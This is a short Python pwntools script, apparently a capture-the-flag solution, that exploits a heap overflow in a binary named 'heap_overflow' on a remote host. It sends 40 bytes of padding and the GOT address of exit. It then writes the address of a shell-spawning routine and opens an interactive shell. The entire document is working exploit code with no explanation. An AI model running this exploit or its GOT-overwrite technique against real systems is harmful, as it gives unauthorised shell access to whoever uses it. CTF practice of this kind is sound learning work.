from pwn import *
context.log_level = 'debug'

# p = process("./heap_overflow")
p = remote("141.164.39.45", 8283)
e = ELF("./heap_overflow")
binsh = 0x0000000000400826

pl = b''
pl += b'A' * 40 + p64(e.got['exit'])

pause()
p.sendline(pl)

pl = b''
pl += p64(binsh)

pause()
p.sendline(pl)

p.interactive()


